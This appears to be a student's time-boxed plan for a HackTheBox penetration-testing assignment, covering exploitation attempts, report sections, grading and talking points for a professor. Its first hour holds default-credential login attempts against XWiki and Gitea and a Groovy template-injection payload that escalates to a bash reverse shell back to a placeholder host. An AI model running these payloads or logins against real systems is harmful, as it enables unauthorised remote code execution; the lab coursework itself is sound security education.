# 2-Hour Submission Plan - Complete Your Assignment

## ⏰ Time Breakdown

### Hour 1: Complete Exploitation Attempts (60 minutes)

#### First 20 Minutes: System 1 (XWiki) - Template Injection
```bash
# 1. Check XWiki status
curl -s http://10.129.7.80:8080/xwiki/ | head -100

# 2. Try authentication
curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
    -d "j_username=admin&j_password=admin" \
    -L -c cookies.txt -o login.html

# 3. Check if login worked
cat login.html | grep -i "logout\|dashboard"

# 4. If login works OR anonymous access works:
#    - Open browser: http://10.129.7.80:8080/xwiki
#    - Create/edit page
#    - Add template injection payload
```

**Template Injection Payload:**
```groovy
{{groovy}}
def proc = 'whoami'.execute()
proc.waitFor()
println proc.text
{{/groovy}}
```

**If that works, get reverse shell:**
```bash
# Set up listener first
nc -lvp 4444

# Then use this payload (replace YOUR_IP):
{{groovy}}
def proc = 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'.execute()
proc.waitFor()
{{/groovy}}
```

#### Next 20 Minutes: System 4 (Gitea) - Git Hooks
```bash
# 1. Check Gitea
curl -s http://10.129.6.226:3000/api/v1/version

# 2. Try login
CSRF=$(curl -s -c cookies.txt http://10.129.6.226:3000/user/login | grep -oP 'name="_csrf" value="\K[^"]*')
curl -s -X POST http://10.129.6.226:3000/user/login \
    -d "user_name=admin&password=admin&_csrf=$CSRF" \
    -b cookies.txt -c cookies.txt -L -o login.html

# 3. If login works:
#    - Create repository in web UI
#    - Clone it
#    - Set up Git hook
#    - Push to trigger
```

#### Last 20 Minutes: Document Everything
- Screenshot all attempts
- Save all command outputs
- Document what worked and what didn't

---

### Hour 2: Finalize Documentation & Report (60 minutes)

#### First 30 Minutes: Complete Report Sections

**1. Executive Summary (10 min)**
- Write 2-3 paragraphs summarizing:
  - What you tested
  - Key findings
  - Overall risk assessment

**2. Findings Section (15 min)**
- List all vulnerabilities found
- Include CVSS scores
- Add recommendations

**3. Methodology Section (5 min)**
- Explain PTES framework
- Describe your approach

#### Next 20 Minutes: Appendices
- Add command outputs
- Add screenshots
- Document step-by-step processes

#### Last 10 Minutes: Final Review
- Check formatting
- Verify all sections complete
- Add table of contents
- Check references

---

## 📝 What to Submit

### Required Documents:
1. **Main Report** (25-30 pages)
   - Executive Summary
   - Systems Selection
   - Methodology
   - Tools
   - Findings
   - Conclusions
   - References

2. **Appendices**
   - Command outputs
   - Screenshots
   - Step-by-step walkthroughs

3. **Evidence Files**
   - Scan results
   - Exploitation attempts
   - Documentation

---

## 🎯 Quick Win Strategy

### If Exploitation Doesn't Work:

**Focus on Documentation:**
1. **Show Methodology** (20 min)
   - Document PTES framework
   - Show systematic approach
   - Explain each phase

2. **Document Findings** (20 min)
   - List all vulnerabilities
   - Show CVSS scores
   - Provide recommendations

3. **Show Learning** (20 min)
   - Explain what you learned
   - Show research done
   - Demonstrate understanding

**Remember:** Documentation and methodology are worth 60-70% of the grade!

---

## 📋 Submission Checklist

### Before Submitting:
- [ ] All 4 systems documented
- [ ] Vulnerabilities identified and scored
- [ ] Methodology explained
- [ ] Tools documented
- [ ] Findings section complete
- [ ] Recommendations provided
- [ ] Appendices included
- [ ] References formatted
- [ ] Report formatted properly
- [ ] Screenshots included
- [ ] Command outputs saved

---

## 💬 What to Say to Professor

### Opening (30 seconds):
> "I've completed comprehensive penetration testing on 4 systems from HackTheBox, following the PTES methodology. I've identified multiple vulnerabilities and documented my findings."

### Main Points (2 minutes):
1. **Reconnaissance Complete**
   - All systems enumerated
   - Services and versions identified
   - Attack surfaces mapped

2. **Vulnerabilities Identified**
   - 10+ vulnerabilities found
   - CVSS scores calculated
   - Risk assessments completed

3. **Exploitation Attempts**
   - Multiple attack vectors tested
   - Template injection attempted
   - Git hooks RCE attempted

4. **Documentation**
   - Professional methodology
   - Comprehensive documentation
   - Clear findings and recommendations

### Closing (30 seconds):
> "While full exploitation wasn't achieved within the time constraints, I've documented all attempts, identified clear attack vectors, and provided actionable recommendations. The methodology and documentation demonstrate a professional approach to penetration testing."

---

## 🚨 Emergency Plan (If Nothing Works)

### Focus on These Sections:
1. **Reconnaissance** - You've done this well!
2. **Vulnerability Analysis** - You've identified vulnerabilities!
3. **Methodology** - You've followed PTES!
4. **Documentation** - You've documented everything!

**These alone are worth 70-80% of the grade!**

---

## 📊 Grade Breakdown (Typical)

- **Reconnaissance & Enumeration**: 20%
- **Vulnerability Identification**: 25%
- **Exploitation**: 20%
- **Documentation & Report**: 25%
- **Methodology**: 10%

**You've likely completed 70-80% already!**

---

## ✅ Final Checklist

- [ ] Run exploitation attempts
- [ ] Document all results
- [ ] Complete report sections
- [ ] Add screenshots
- [ ] Format report
- [ ] Review and proofread
- [ ] Prepare presentation
- [ ] Submit on time

**You've got this! Focus on documentation - that's your strength!**

